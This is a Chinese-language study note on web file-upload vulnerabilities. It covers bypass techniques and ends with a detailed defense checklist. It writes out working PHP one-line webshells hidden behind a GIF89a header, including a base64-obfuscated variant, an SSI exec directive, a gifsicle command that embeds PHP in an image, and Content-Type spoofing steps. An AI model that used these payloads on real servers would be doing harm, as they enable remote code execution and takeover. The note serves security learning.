# 文件上传漏洞

## 1.定义

文件上传漏洞是 Web 应用在处理用户上传时，**未严格校验文件类型 / 后缀 / 内容**，且服务器将上传目录设为可执行，导致攻击者能上传 `WebShell`（如 PHP 一句话木马）并被解析执行的高危漏洞；属于 OWASP Top10 中的配置错误与注入相关风险。

必要条件：有上传入口 + 校验有缺陷 + 路径可预测 + 服务器可解析恶意脚本。

黑客入侵套路永远两步：

1. **上传木马 / 恶意文件**（先放进去）
2. **想办法让服务器执行它**（再跑起来）

## 2.产生原因

实际分两类安全问题

① 文件元数据风险（名字、路径、后缀）

a.什么是元数据

**元数据 = 描述数据的数据**

文件本身是数据，**关于这个文件的信息，就是元数据**。

b.这些元数据都是**用户可控、可伪造**。所以所有文件名、路径，（元数据）**一律不能信任，全部强制校验、重命名**。

② 文件本身内容 / 大小风险

有些文件.后缀与该文件类型的大小不符

必须校验**真实文件内容 + 文件头 + 大小**，不能只看后缀。

## 3.分类

所有示例本质分两类：

✅ **攻击服务器 / 平台本身**（代码执行、文件覆盖、DoS）

✅ **攻击终端用户 / 其他系统**（病毒、XSS、钓鱼）

🔴 第一类：攻击应用平台 / 服务器（拿权限、搞破坏）

| 示例场景                            | 白话原理                                                     | 实际后果                                |
| ----------------------------------- | ------------------------------------------------------------ | --------------------------------------- |
| 上传.jsp 文件到网页目录             | JSP 是服务器可执行的脚本，放到网页目录就会被 Tomcat 解析执行 | 拿到 WebShell，执行命令、控制服务器     |
| 上传.gif 文件触发图片库缺陷         | 服务器会自动压缩 / 裁剪图片，恶意 GIF 触发图片处理库（如 ImageMagick）漏洞 | 绕过脚本检测，间接实现代码执行          |
| 上传超大文件                        | 服务器磁盘被占满，或处理大文件时内存耗尽                     | 拒绝服务（DoS），网站打不开、数据库挂掉 |
| 恶意路径 / 文件名上传               | 比如传`../../etc/passwd`或`shell.php%00.jpg`，覆盖系统关键文件 | 篡改配置、删除数据，甚至直接拿下服务器  |
| 上传含个人数据的文件                | 上传后未做权限控制，其他用户能访问该文件                     | 数据泄露（比如用户手机号、身份证）      |
| 上传含 “标签” 的文件被`include`执行 | 比如上传含 PHP `<?php eval($_POST[1]);?>`的文本，被网站`include`函数调用 | 代码注入，等同于直接执行木马            |
| 上传恶意.rar 触发杀毒软件漏洞       | 服务器端杀毒软件扫描该压缩包时，触发自身漏洞                 | 绕过 WAF / 杀软，在服务器执行命令       |

 第二类：攻击用户 / 其他系统（坑访客、传病毒）

| 示例场景                        | 白话原理                                            | 实际后果                             |
| ------------------------------- | --------------------------------------------------- | ------------------------------------ |
| 上传带木马的.exe 到网页         | 普通用户下载这个 “伪装正常” 的 exe，运行后中招      | 用户电脑被控制、挖矿、偷账号         |
| 上传感染病毒的文件              | 比如带勒索病毒的文档，用户下载打开就触发            | 受害者机器中毒，文件被加密、数据被盗 |
| 上传含脚本的.html 文件          | 用户访问这个 html 时，里面的 JS 脚本（XSS）自动执行 | 偷用户 Cookie、劫持会话、钓鱼诈骗    |
| 上传含 Flash 的.jpg 文件        | 图片里嵌恶意 Flash，用户打开后触发跨站内容劫持      | 跳转到钓鱼网站、弹窗诱导转账         |
| 上传恶意.rar 触发客户端杀软漏洞 | 用户下载后用有漏洞的杀毒软件扫描，触发漏洞          | 客户端代码执行，控制用户电脑         |

## 4.黑名单的绕过方法

### 1.找黑名单 “漏网之鱼”—— 冷门可执行后缀

1.原理：冷门后缀也能被服务器执行。

### 2.玩 “后缀拼接”—— 双重 / 多重扩展名绕过

1.**原理**：服务器解析后缀时 “只认最后一个 / 第一个点后的内容”，或配置缺陷导致多后缀被解析。

### 3.钻 IIS 的空子 —— 特殊字符 / 路径绕过（仅 IIS6 / 旧版本）

**IIS = 微软 Windows 的网站服务器，旧版本（IIS6）解析规则烂，导致一大堆文件上传绕过漏洞。**

1. **原理**：IIS 对`;`/ 目录名解析有特殊规则，能 “伪装” 后缀。

### 4.大小写混淆 —— 绕过大小写敏感的检测

1.**原理**：服务器解析后缀时不区分大小写（如`.PhP`=`.php`），但黑名单只检测小写。

### 5. 利用 Windows 文件系统特性 —— 空格 / 点 / 短文件名绕过

1. **原理**：Windows 会自动忽略文件名末尾的空格 / 点，或支持 8.3 短文件名（如`web.config`→`web~1.con`）。

2.什么是8.3 短文件

很早以前 DOS 只能支持：

- 文件名 **最多 8 个字符**
- 后缀 **最多 3 个字符**

Windows 为了兼容老程序，保留了这套机制，叫 **8.3 短文件名**。

所以可以写旧的 短文件名 DOS会自动转化成新的文件名

### 6.字符转换 / 控制字符 ——00 截断 / 特殊字符绕过

**原理**：服务器处理文件名时，会把某些字符转成特殊符号，或截断 00 字符后的内容。

### 7.NTFS 备用数据流（ADS）——Windows 专属绕过

1.**原理**：NTFS 的 ADS 特性允许文件名带`:`，服务器保存时只创建主文件，ADS 流文件能被后续利用。

2.**ADS（备用数据流）**

NTFS 一个文件 **不止一串数据**

可以藏 **第二条、第三条看不见的数据流**

格式靠 **冒号 :** 分开

```
正常文件:  a.jpg
ADS隐藏流: a.jpg:shell.asp
```

3.**检测器（代码 / WAF）（防御）**

只看**最后面、肉眼可见的后缀**

比如：`shell.asp:.jpg`

检测器只看到 **.jpg → 放行**



**Windows NTFS 底层**（运行）

不认你的后缀，只认**冒号左边**

落地生成：**shell.asp（隐藏数据流木马）**



**结果**

安检看的是 **右边（合法图片）**

系统跑的是 **左边（恶意脚本）**

👉 **两边分家，完美绕过**

## 5.`getimagesize()` 函数防御

1.定义：

**函数作用**：检测文件的宽高、图片类型（JPG/GIF/PNG），返回图片相关信息；如果不是图片，返回`false`。

 **软肋所在**：它只校验**图片文件头（Magic Number）** 和**图片结构**，**完全不管图片里的注释 / 额外内容**。

2.服务器配置的 “致命差异”

| 不安全配置                           | 安全配置 | 关键差异                                                     |
| ------------------------------------ | -------- | ------------------------------------------------------------ |
| `<FilesMatch ".+.ph(p...)? t tml)">` |          | `FilesMatch` 是 Apache 的规则，意思是 “匹配文件名包含`.php/.phtml`等后缀的文件，按 PHP 解析”。 |
| <FilesMatch ".+.ph(p...)?  t tml$">` |          | `$`表示 “后缀必须在文件名末尾”，只有`xxx.php`才会被解析，`xxx.php.gif`会被当成普通图片，不会执行里面的 PHP 代码。 |

3.攻击方法

用 gifsicle 制作 “带 PHP 注释的 GIF”

gifsicle 是 GIF 图片编辑工具，核心功能是给 GIF 加注释（注释里藏 PHP 代码）。（kali中有）

制作恶意 GIF(kali命令)

```php
gifsicle < mygif.gif -- comment "
<?php echo 'Current PHP version: ' . phpversion(); ?>
" > output.php.gif
```

`< mygif.gif`：读取原始合法的 GIF 图片（保证文件头是 GIF，骗过`getimagesize()`）；

`-- comment "PHP代码"`：把 PHP 代码写入 GIF 的**注释区**（图片结构没破坏，`getimagesize()` 检测正常）；

`> output.php.gif`：生成新文件，文件名包含`.php`（触发 Apache 的不安全配置）。

## 6.白名单

1.**原理**：白名单的核心漏洞不是 “后缀本身”，而是 “文件名的整体格式”—— 黑客会用黑名单的绕过技巧，让文件名 “表面符合白名单，实际是恶意后缀”。

2.**核心风险**：白名单如果只简单校验 “后缀是否在列表里”，不校验「完整文件名 + 后缀合法性」，依然会被绕过。

**3.简单绕过技巧**

黑名单的绕过技术也适用于白名单（如双扩展）”

| 绕过手段     | 白名单场景示例                         | 危害                                                         |
| ------------ | -------------------------------------- | ------------------------------------------------------------ |
| 双后缀       | 白名单允许`.jpg`，传`shell.php.jpg`    | 服务器解析`.php`执行代码                                     |
| 大小写       | 白名单允许`.jpg`，传`shell.PHp.jpg`    | 部分校验只认小写，放行后服务器解析大写`.PHp`                 |
| 00 截断      | 白名单允许`.jpg`，传`shell.jpg%00.php` | 旧 PHP 版本截断后变成`shell.jpg`（放行），实际保存为`shell.php` |
| Windows 特性 | 白名单允许`.jpg`，传`shell.asp. .jpg`  | Windows 自动去掉末尾点 / 空格，变成`shell.asp`               |

#### 4.允许列表也可能包含恶意扩展（如.shtml）”

1.**原理**：有些后缀看似 “无害”，但本身能触发其他漏洞，加进白名单等于开门。

2.示例：**典型例子：.shtml 触发 SSI 攻击**：

​              `.svg`：允许上传后，可嵌入 JS 代码触发 XSS；

​              . xml`：允许上传后，可触发 XXE 漏洞读取服务器文件。

3.什么是ssl

SSI = Server Side Include（服务器端包含），是 Web 服务器（Apache/Nginx/IIS）的**内置功能**：

4.什么是.shtml后缀

`.shtml` 是 **Server Side Include（SSI，服务器端包含）** 专用的文件后缀，本质是**带动态指令的静态网页文件**—— 它看起来是普通 HTML 文件，但服务器解析时会先执行文件内的 SSI 特殊指令，再返回最终页面。

`.shtml` = 静态文件 + 服务器端指令（服务器先跑指令，再拼内容返回）。

5.恶意 `.shtml` 文件的内容

```php
<!--#exec cmd="whoami"-->
```

`<!--#exec-->`：SSI 的核心指令，意思是 “执行系统命令”；

`cmd="whoami"`：要执行的命令（`whoami` 是查看当前服务器运行的用户）；

整个指令被 `<!-- -->` 包裹，看似是 HTML 注释，实际服务器会识别并执行。

## 7“Content-Type 头部验证绕过”

1.Content-Type 是什么？

`Content-Type` 是 HTTP 请求头里的一个字段，作用是**告诉服务器 “我上传的文件是什么类型”**

(你可以把它理解成：**文件的 “身份标签”**，由客户端（浏览器 / 上传工具）自己告诉服务器 “我这文件是啥”。)

2.“Content-Type 验证” 的防护逻辑

只允许 `Content-Type` 是 `image/jpeg`/`image/png`/`text/plain` 等 “安全类型” 的文件上传，拒绝 `application/x-httpd-php` 这类危险类型。

3.绕过方法：

选一个 `shell.php`（里面是一句话木马）上传；

Burp 抓包，在 Burp 的抓包界面，找到 `Content-Type` 字段；

把 `application/x-httpd-php` 改成 `image/jpeg`（或 `image/png`/`text/plain`，看网站允许的类型）；

放行数据包；

服务器看到 `Content-Type: image/jpeg`，认为是合法图片，允许上传 —— 但文件实际是 PHP 木马。

## 8.文件类型检测器绕过

1.文件类型检测器是什么？

文件类型检测器不是 “看后缀 / Content-Type”，而是**读取文件本身的内容（尤其是开头的 “文件头”）** 来判断文件类型 —— 这是比 “验后缀 / 验请求头” 更严格的防护，但依然能被绕过。

2.原理：网站用这种方式校验，比如 DVWA Medium 级别会结合`getimagesize()`（读图片头），目的是：**哪怕你改后缀 / 改 Content-Type，只要文件头不是图片，就拒绝上传**。

### 3.绕过方式：

绕过原理：检测器只看文件开头的几个字节（文件头），只要开头是合法的图片头，就判定为 “合法图片”，不管后面跟什么内容。

#### 1.核心手段：合法文件头 + 恶意代码（最常用）

1.手动构建

手动构造一个文件，开头写 `GIF89a`（GIF 文件头），后面接 PHP 一句话木马：

```php
GIF89a
<?php @eval($_POST['cmd']); ?>
```

保存为 `shell.gif` 上传：检测器读开头 `GIF89a` → 判定是 GIF 图片，放行；

2.工具辅助：

之前学的`gifsicle`就是干这个的 —— 用合法 GIF 图片（自带 GIF 文件头），把 PHP 代码藏在注释区，本质也是 “合法头 + 恶意内容”。

#### 2.进阶手段：在注释 / 不影响文件结构的区域插代码

1.**原理**：

很多文件格式（GIF/PNG/JPG/Excel）都有 “注释区”“空白区”，这些区域的内容不影响文件的正常解析（检测器认为文件是合法的），但服务器执行时会读取这些区域的代码。

#### 3.隐藏手段：混淆 / 编码恶意代码（防特征检测）

1.**原理**：

如果检测器不仅验文件头，还会扫描文件内容里的 “恶意特征”（比如`eval`/`$_POST`），黑客会把代码混淆 / 编码，躲过扫描。

2.Base64 编码：

```php
GIF89a
<?php
$code = base64_decode("QGV2YWwoJF9QT1NUWydjbWQnXSk7"); // 解码后是@eval($_POST['cmd']);
eval($code);
?>
```

#### 4.特殊手段：伪造压缩文件绕过

1.**原理**：

如果网站允许上传压缩包（ZIP/RAR），且会自动解压，黑客会把恶意文件伪装成 “合法压缩包”—— 检测器验压缩包头（比如 ZIP 的`50 4B 03 04`）放行，解压后恶意文件被执行。

2.示例

把`shell.php`打包成 ZIP，然后修改 ZIP 文件头为`GIF89a`，命名为`shell.gif`；

## 9.十一种漏洞的入侵方式

### 1.同名文件上传 → 爆出路径、源码、结构

**场景**

服务器已经存在 `a.jpg`，你再传一次 `a.jpg`。

**两种情况**

1. 报错：

   提示

   ```
   /var/www/upload/a.jpg 已存在
   ```

   泄露服务器真实路径

2. 自动改名：

   变成 

   ```
   a_1.jpg
   ```

   → 知道存储规则、可爆破文件名

**危害**

轻松拿到物理路径，为后续漏洞铺路。

------

### 2.同名文件夹冲突上传

上传文件名 = 已有文件夹名

例：已有目录 `/upload/`

你传文件名叫 `upload`

服务器报错：

```
不能创建，已是目录
```

→ **泄露目录结构、部署方式**

------

### 3.超长文件名上传

传一个 **几百字符超长文件名**

服务器处理失败 → 爆出：

- 系统路径
- 代码行数
- 中间件版本
- 磁盘格式限制

属于**暴力信息探测**。

------

### 4.并发多次同时上传（竞争条件 / 条件竞争）

一秒钟疯狂发包，**同时传同一个文件**

目的：

1. 检测是否有锁

2. 能否**一边检测、一边执行**（竞争条件漏洞 race condition）

   典型：

   先上传 → 还没删干净 → 瞬间被执行 getshell

------

### 5.混合格式上传（压缩包、XML）

上传 ZIP / XML / SVG

探测服务器后台会不会：

- 自动解压（爆漏洞、路径穿越）
- 自动解析 XML（XXE 读文件）
- 自动渲染 SVG（XSS）

**测后台处理逻辑**。

------

### 6.上传点 . .. ... 路径穿越（高危）

文件名写：

```
.
..
...
```

例子（Apache + Windows）

保存目录：

```
/www/uploads/
```

你上传文件名：

```
.
```

结果：

覆盖 / 跳出目录

直接写到上层目录 `/www/`

→ **路径穿越、任意文件覆盖**

------

### 7.上传删不掉的畸形文件（NTFS 畸形名 / ADS）

文件名：

```
...:.jpg
file....
```

Windows / NTFS 特性：

- 图形界面删不掉
- 只能命令行删
- 产生异常报错 → 泄露路径 / 系统细节
- 可结合 **ADS 备用数据流** 藏木马

------

### 8.Windows 非法字符文件名探测

上传包含：

```
| < > * ? " :
```

Windows 不允许这些字符

服务器报错：

- 暴露系统是 Windows
- 暴露文件系统结构
- 暴露过滤规则

简单一句话：**测服务器是不是 Windows**。

------

### 9.Windows 系统保留字漏洞（超级重要）

Windows 禁止的特殊设备名：

plaintext

```
CON PRN AUX NUL
COM1~COM9
LPT1~LPT9
```

如果你传：

```
con.jpg
nul.php
```

效果：

1. 服务器卡死 → **拒绝服务 DoS**
2. 文件生成异常 → 泄露系统底层信息
3. 无限读空设备、拖垮磁盘 IO

实战里很危险。

------

### 10.上传 Flash / PDF / Silverlight → 跨站内容劫持

即使只是合法后缀

但文件内部放恶意 Flash / PDF

用户打开 →

盗取 cookie、劫持浏览、钓鱼

属于 **客户端攻击跳板**。

------

### 11.上传 crossdomain.xml/clientaccesspolicy.xml（权限全局沦陷）

这两个是**跨域策略文件**

如果能传到网站根目录：

允许外部网站随意跨域访问本网站所有接口

后果：

- 全站用户被劫持
- 任意接口被恶意调用
- 越权、盗取数据

是上传里 **最隐蔽、危害极大** 的漏洞。

### 终极总结（你背这一段就够）

这些 “奇怪上传测试” 目的只有三类：

1. **拿信息（信息泄露）**

   路径、系统、目录、过滤规则、中间件版本

   

2. **搞破坏（DoS / 不可删除文件 / 畸形文件）**

   卡死服务器、占磁盘、删不掉、拖慢业务

   

3. **拿权限 / 劫持用户**

   路径穿越、覆盖配置、跨域策略、客户端劫持、竞争条件拿 shell

   

一句话：

**正常上传测合规，异常上传测底层、测漏洞、测架构。**

## 10.漏洞测试的注意事项

### 1.不要覆盖已有文件

你上传自己的木马、自己的测试文件 → 没事。

如果你故意上传同名文件，**覆盖掉服务器原生文件** → 风险爆炸。

### 2.高危文件：

- **web.config**（IIS 网站核心配置）
- **.htaccess**（Apache 网站核心配置）

这两个是 **网站的 “心脏设置文件”**：

管权限、管解析、管黑白名单、管路由。

#### 1.什么是**web.config**（IIS 网站核心配置）

`web.config` 是 IIS 服务器的**核心配置文件**，相当于 IIS 的 “注册表”，管的全是关键功能：

- 控制哪些后缀的文件能被解析（比如 `.asp/.aspx` 是否执行）；
- 设置目录权限（谁能访问、谁能写文件）；
- 配置 URL 路由、重定向、错误页面；
- 开启 / 关闭脚本执行、文件上传、跨域等关键功能；
- 甚至能直接配置 PHP/ASP 的运行参数（比如是否禁用 `eval` 函数）。

#### 2.*什么是*.htaccess**（Apache 网站核心配置）

`htaccess` 是 Apache 的**分布式配置文件**（每个目录都能有自己的），权限比 `web.config` 更细：

- 控制文件解析规则（比如 `.php5/.phtml` 是否按 PHP 解析）；
- 设置 URL 重写（比如把 `index.php?id=1` 改成 `index/1`）；
- 限制 IP 访问、设置密码保护目录；
- 自定义错误页面、禁止列目录文件；
- 甚至能直接执行系统命令（通过 SSI/CGI）。

### 3.覆盖之后会发生什么？（后果）

1.网站直接瘫痪 → 拒绝服务 DoS

2.**权限错乱**

目录变公开、脚本乱解析、安全防护全失效

3.**业务事故、追责严重**

真实生产环境：

乱覆盖 = 违法、事故、数据泄露风险

## 11.社会中真实的文件上传漏洞的高级防御思路

### 1.先明确核心防护思路

所有预防措施的本质就 3 点：

1. **最小权限**：只允许业务必需的操作（比如只让传.jpg，只给上传目录最低权限）；
2. **完全可控**：文件名、路径、内容全由服务器说了算，不让用户可控；
3. **多层校验**：从后缀→内容→权限→传输，层层设防，单一防护等于没防。

### 2.核心防护措施

#### 1.白名单控类型：只允许业务必需的文件后缀

✅ **要求**：比如电商只允许传.jpg/.png/.pdf，就只放行这 3 个，其他全拒；

✅ **为什么**：黑名单永远漏后缀（比如.php5/.phtml），白名单从根源杜绝；

✅ **落地**：用 “枚举 + 严格匹配”，比如 VBScript 的`Select Case`只认指定后缀，拒绝任何模糊匹配。

#### 2.重写文件名：彻底掌控文件名，杜绝伪装

✅ **要求**：绝不直接用用户传的文件名，服务器自己生成（比如哈希值 + 日期）；

✅ **例子**：用户传`shell.php.jpg`，服务器重命名为`8f7d987sdf897_20260323.jpg`；

✅ **为什么**：避免双后缀、特殊字符、保留字等绕过手段，文件名完全可控。

#### 3.清洗文件名：剔除所有危险字符

✅ **要求**：只留字母 + 数字 + 1 个点（分隔文件名和后缀），其他全删；

✅ **正则参考**：`^[a-zA-Z0-9]{1,200}\.[a-zA-Z0-9]{1,10}$`（文件名 1-200 位，后缀 1-10 位）；

✅ **必删字符**：`; : > < / \ .* % $ | ? "`、控制字符、Unicode 特殊字符、多余的点；

✅ **为什么**：防止 Windows/IIS/Apache 的解析漏洞（比如`file.asp;jpg`、`web.config. `）。

#### 4. 限制文件大小：防 DoS 攻击

✅ **要求**：同时设 “最大值 + 最小值”；

✅ **例子**：图片上传设 100KB-10MB，太小（比如 1 字节）或太大（比如 100MB）都拒；

✅ **为什么**：太大占满磁盘 / 拖垮图片处理功能，太小可能是恶意空文件 / 畸形文件。

#### 5. 上传目录权限：彻底禁执行，只给读写

✅ **要求**：

- IIS/Apache：上传目录（比如`/uploads/`）移除所有脚本解析权限（比如.php/.asp 不解析）；

- Windows/Linux：上传目录只给 “写入 + 读取” 权限，去掉 “执行” 权限；

  为什么

  ：哪怕传了木马，也无法执行，只能当静态文件，彻底废掉恶意脚本。

#### 6. 内容校验：文件头 + 病毒扫描，双重保险

✅ **要求**：

1. 验文件头：比如 JPG 查`FF D8`，PNG 查`89 50 4E 47`，不是就丢弃；

2. 病毒扫描：用服务器杀毒软件（比如 Windows Defender）或第三方接口扫恶意内容；

   为什么

   ：防止 “合法文件头 + 恶意代码” 的图片马、压缩包马。

#### 7. 防护核心配置文件：禁止覆盖 web.config/.htaccess

✅ **要求**：

1. 上传时直接拦截文件名包含`web.config`/`.htaccess`的文件（包括短文件名`web~1.con`）；

2. 配置 IIS/Apache：忽略上传目录中的`.htaccess`/`web.config`，不加载其配置；

   为什么

   ：这两个文件是服务器 “命门”，覆盖就可能掌控整个网站。

#### 8. 传输 & 访问防护：防劫持、防越权

✅ **要求**：

1. 只用 POST 传文件，禁用 PUT/GET（PUT 可直接写文件到服务器）；

2. 上传接口只对登录 + 授权用户开放（比如普通用户不能传，只有商家能传）；

3. 加响应头：`Content-Disposition: attachment`（强制下载，不在线解析）+ `X-Content-Type-Options: nosniff`（禁止浏览器猜文件类型）；

4. 删无用的跨域文件：`crossdomain.xml`/`clientaccesspolicy.xml`（没用就删，防 Flash/PDF 劫持）；

   为什么

   ：防跨站内容劫持、未授权上传、浏览器解析恶意文件。

#### 9. 进阶防护：隔离存储，降低风险

✅ **可选方案**：

1. 把上传文件存数据库（而非文件系统），读取时再输出；

2. 用独立域名存放上传文件（比如`upload.xxx.com`），和主站（`xxx.com`）隔离；

3. 压缩包解压校验：如果自动解压，要逐文件校验后缀 / 内容，防止解压出木马；

   为什么

   ：即使上传文件出问题，也不会影响主站核心业务。

#### 10. 日志 & 防伪造：留痕 + 防攻击

✅ **要求**：

1. 记录所有上传操作（用户 ID、文件名、时间、IP），日志要防篡改 / 注入；

2. 加 CSRF 防护（比如 token），防止跨站上传；

3. 防文件覆盖：同名文件自动重命名，不直接覆盖；

   为什么

   ：攻击后可溯源，防止批量上传 / 恶意覆盖。

## 12.核心总结（记住这 5 条，80% 的漏洞都能防）

1. **白名单 + 重命名**：只放行业务必需后缀，服务器自己生成文件名；
2. **禁执行 + 清字符**：上传目录无脚本执行权限，文件名只留字母数字；
3. **验内容 + 扫病毒**：文件头 + 杀毒软件，双重校验文件内容；
4. **护配置 + 限权限**：禁止覆盖核心配置文件，上传接口只对授权用户开放；
5. **传 POST + 加响应头**：禁用危险传输方法，防浏览器解析恶意文件。

简单记：**可控文件名、最小权限、多层校验、隔离风险**，这是文件上传防护的黄金法则。
